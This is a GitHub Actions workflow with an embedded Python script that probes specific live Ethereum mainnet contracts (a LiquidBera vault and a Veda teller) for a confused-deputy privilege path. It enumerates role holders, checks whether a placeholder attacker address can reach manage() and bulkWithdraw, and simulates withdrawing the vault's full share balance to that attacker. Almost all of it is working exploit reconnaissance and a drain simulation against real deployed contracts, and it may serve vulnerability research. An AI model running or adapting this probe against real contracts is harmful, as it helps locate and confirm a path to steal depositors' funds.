name: veda-liquidbera-deputy-v2

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable
      - name: Verify transitive LiquidBeraETH privilege and public reachability
        shell: bash
        run: |
          python3 - <<'PY'
          import json, subprocess, time, urllib.parse, urllib.request, traceback
          RPCS=["https://ethereum-rpc.publicnode.com","https://eth.drpc.org","https://rpc.mevblocker.io"]
          ATTACKER="0x1111111111111111111111111111111111111111"; USER_ROLE_TOPIC="0x4c9bdd0c8e073eb5eda2250b18d8e5121ff27b62064fbeeeed4869bb99bc5bf2"
          EXT={"vault":"0x83599937c2C9bEA0E0E8ac096c6f32e86486b410","accountant":"0x04B8136820598A4e50bEe21b8b6a23fE25Df9Bd8","teller":"0xd445C65e4821dbD4ed0114eCDF6325c69faD7653","queue":"0xE2f6157656ed2BBBD87f1c01A29c1b92acb17476","solver":"0x45D85C0A1168726Bbee2352D78E7647f70654d56","manager":"0x62b283d4FeFB2a120e1120dba9f83bE6CA41bCD7","authority":"0x5979F753b417c17FCd8f8c87b86154A0EB0E2c17","timelock":"0x946F01f13eCafdbbd4CC2BDEd41703b3365b9D17"}
          VEDA={"vault":"0xf0bb20865277aBd641a307eCe5Ee04E79073416C","teller":"0x9AA79C84b79816ab920bBcE20f8f74557B514734","authority":"0x485Bde66Bb668a51f2372E34e45B1c6226798122"}
          WEETH="0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee"
          def rpc(ep,m,p,t=35):
            b=json.dumps({"jsonrpc":"2.0","id":1,"method":m,"params":p}).encode();q=urllib.request.Request(ep,data=b,method="POST",headers={"content-type":"application/json","user-agent":"veda-liquidbera-v2/1.0"})
            with urllib.request.urlopen(q,timeout=t) as r:o=json.loads(r.read().decode())
            if "error" in o:raise RuntimeError(o["error"])
            return o["result"]
          def choose():
            bad={}
            for ep in RPCS:
              try:
                if int(rpc(ep,"eth_chainId",[]),16)==1:return ep,bad
              except Exception as e:bad[ep]=repr(e)
            raise RuntimeError(bad)
          def http(url):
            q=urllib.request.Request(url,headers={"accept":"application/json","user-agent":"veda-liquidbera-v2/1.0"})
            with urllib.request.urlopen(q,timeout=45) as r:return json.loads(r.read().decode())
          def cmd(*a):
            p=subprocess.run([str(x) for x in a],text=True,capture_output=True);return {"ok":p.returncode==0,"stdout":p.stdout.strip(),"stderr":p.stderr.strip(),"returncode":p.returncode}
          def sig(s):return cmd("cast","sig",s)["stdout"].lower()
          def calldata(s,*a):return cmd("cast","calldata",s,*a)["stdout"]
          def st(x):return x[2:] if str(x).startswith("0x") else str(x)
          def aw(a):return st(a).lower().rjust(64,"0")
          def sw(s):return st(s).lower().ljust(64,"0")
          def addr(x):return "0x"+st(x)[-40:].lower()
          def uint(x):return int(x,16) if x and x!="0x" else 0
          def boolean(x):return bool(uint(x))
          def push4(code):
            h=st(code);o=set();i=0
            while i+10<=len(h):
              if h[i:i+2].lower()=="63":o.add("0x"+h[i+2:i+10].lower());i+=10
              else:i+=2
            return sorted(o)
          S={"owner":sig("owner()"),"authority":sig("authority()"),"getUserRoles":sig("getUserRoles(address)"),"canCall":sig("canCall(address,address,bytes4)"),"public":sig("isCapabilityPublic(address,bytes4)"),"manage1":sig("manage(address,bytes,uint256)"),"manageN":sig("manage(address[],bytes[],uint256[])"),"manageMerkle":sig("manageVaultWithMerkleVerification(bytes32[][],address[],address[],bytes[],uint256[])"),"setRoot":sig("setManageRoot(address,bytes32)"),"root":sig("manageRoot(address)"),"bulkDeposit":sig("bulkDeposit(address,uint256,uint256,address)"),"bulkWithdraw":sig("bulkWithdraw(address,uint256,uint256,address)"),"balanceOf":sig("balanceOf(address)"),"totalSupply":sig("totalSupply()"),"threshold":sig("getThreshold()"),"owners":sig("getOwners()")}
          def call(ep,to,data,frm=None):
            tx={"to":to,"data":data}
            if frm:tx["from"]=frm
            return rpc(ep,"eth_call",[tx,"latest"])
          def safe(ep,to,data,frm=None):
            try:return {"ok":True,"raw":call(ep,to,data,frm)}
            except Exception as e:return {"ok":False,"error":repr(e)}
          def gate(ep,auth,caller,target,sel):return {"canCall":boolean(call(ep,auth,S["canCall"]+aw(caller)+aw(target)+sw(sel))),"public":boolean(call(ep,auth,S["public"]+aw(target)+sw(sel)))}
          def role_logs():
            p=urllib.parse.urlencode({"module":"logs","action":"getLogs","address":EXT["authority"],"fromBlock":0,"toBlock":"latest","topic0":USER_ROLE_TOPIC,"page":1,"offset":1000});d=http(f"https://api.routescan.io/v2/network/mainnet/evm/1/etherscan/api?{p}");r=d.get("result");return [] if isinstance(r,str) else (r or [])

          ep,bad=choose();block=int(rpc(ep,"eth_blockNumber",[]),16);out={"generated_at_unix":int(time.time()),"block":block,"endpoint":ep,"rpc_failures":bad,"addresses":EXT,"veda":VEDA,"direct_gates":{},"holders":{},"candidate_paths":[],"errors":[]}
          try:
            out["liquidbera_liquideth_share_balance"]=uint(call(ep,VEDA["vault"],S["balanceOf"]+aw(EXT["vault"])))
            out["liquidbera_weeth_balance"]=uint(call(ep,WEETH,S["balanceOf"]+aw(EXT["vault"])))
            out["liquidbera_total_supply"]=uint(call(ep,EXT["vault"],S["totalSupply"]))
            checks=[("attacker_ext_vault_manage1",EXT["authority"],ATTACKER,EXT["vault"],S["manage1"]),("attacker_ext_vault_manageN",EXT["authority"],ATTACKER,EXT["vault"],S["manageN"]),("attacker_ext_manager_merkle",EXT["authority"],ATTACKER,EXT["manager"],S["manageMerkle"]),("manager_ext_vault_manage1",EXT["authority"],EXT["manager"],EXT["vault"],S["manage1"]),("ext_vault_veda_bulkDeposit",VEDA["authority"],EXT["vault"],VEDA["teller"],S["bulkDeposit"]),("ext_vault_veda_bulkWithdraw",VEDA["authority"],EXT["vault"],VEDA["teller"],S["bulkWithdraw"]),("attacker_veda_bulkWithdraw",VEDA["authority"],ATTACKER,VEDA["teller"],S["bulkWithdraw"])]
            for n,a,c,t,s in checks:
              try:out["direct_gates"][n]=gate(ep,a,c,t,s)
              except Exception as e:out["direct_gates"][n]={"error":repr(e)}
            out["manage_roots"]={x.lower():safe(ep,EXT["manager"],S["root"]+aw(x)) for x in (ATTACKER,EXT["manager"],EXT["vault"],EXT["teller"],EXT["solver"])}
            logs=role_logs();users=set();events=[]
            for l in logs:
              ts=[str(x).lower() for x in (l.get("topics") or [])]
              if len(ts)<3:continue
              u=addr(ts[1]);users.add(u);events.append({"user":u,"role":int(st(ts[2]) or "0",16),"enabled":bool(int(st(l.get("data","0x")) or "0",16)),"block":int(l.get("blockNumber","0x0"),16)})
            owner=addr(call(ep,EXT["authority"],S["owner"]));users.add(owner);out["authority_owner"]=owner;out["event_count"]=len(events);out["events"]=events
            known={x.lower() for x in EXT.values()};arbitrary=["manage(address,bytes,uint256)","manage(address[],bytes[],uint256[])","manageVaultWithMerkleVerification(bytes32[][],address[],address[],bytes[],uint256[])","execute(address,uint256,bytes)","execute(address,uint256,bytes,bytes32,bytes32)","executeBatch(address[],uint256[],bytes[],bytes32,bytes32)","multicall(bytes[])","execTransactionFromModule(address,uint256,bytes,uint8)"]
            for u in sorted(users):
              roles=uint(call(ep,EXT["authority"],S["getUserRoles"]+aw(u)))
              if roles==0 and u!=owner:continue
              code=rpc(ep,"eth_getCode",[u,"latest"]);sels=push4(code);h={"roles":roles,"code_bytes":len(st(code))//2,"known":u in known,"push4":sels,"surface":{x:sig(x) in sels for x in arbitrary},"gates":{}}
              for n,t,s in [("vault.manage1",EXT["vault"],S["manage1"]),("vault.manageN",EXT["vault"],S["manageN"]),("manager.manageMerkle",EXT["manager"],S["manageMerkle"]),("manager.setRoot",EXT["manager"],S["setRoot"])]:
                try:h["gates"][n]=gate(ep,EXT["authority"],u,t,s)
                except Exception as e:h["gates"][n]={"error":repr(e)}
              if h["code_bytes"]:
                h["owner"]=safe(ep,u,S["owner"]);h["authority"]=safe(ep,u,S["authority"]);h["threshold"]=safe(ep,u,S["threshold"]);h["owners"]=safe(ep,u,S["owners"])
                h["attacker_manage_probe"]=safe(ep,u,calldata("manage(address,bytes,uint256)",VEDA["teller"],calldata("bulkWithdraw(address,uint256,uint256,address)",WEETH,0,0,ATTACKER),0),ATTACKER)
                if h["attacker_manage_probe"].get("ok"):out["candidate_paths"].append({"holder":u,"call":"manage","result":h["attacker_manage_probe"]})
              out["holders"][u]=h
            bulk=calldata("bulkWithdraw(address,uint256,uint256,address)",WEETH,out["liquidbera_liquideth_share_balance"],0,ATTACKER)
            out["attacker_direct_manage_simulation"]=safe(ep,EXT["vault"],calldata("manage(address,bytes,uint256)",VEDA["teller"],bulk,0),ATTACKER)
          except Exception as e:
            out["errors"].append({"error":repr(e),"traceback":traceback.format_exc()})
          with open("veda-liquidbera-deputy-v2.json","w",encoding="utf-8") as f:json.dump(out,f,indent=2,sort_keys=True);f.write("\n")
          print(json.dumps({"block":block,"share_balance":out.get("liquidbera_liquideth_share_balance"),"direct_gates":out["direct_gates"],"candidate_paths":out["candidate_paths"],"errors":out["errors"],"holders":{u:{"roles":h.get("roles"),"bytes":h.get("code_bytes"),"gates":h.get("gates"),"surfaces":[k for k,v in h.get("surface",{}).items() if v],"attacker_manage":h.get("attacker_manage_probe",{}).get("ok")} for u,h in out["holders"].items()}},indent=2,sort_keys=True))
          PY
      - name: Upload robust transitive privilege proof
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: veda-liquidbera-deputy-v2
          path: veda-liquidbera-deputy-v2.json
          if-no-files-found: error
          retention-days: 1
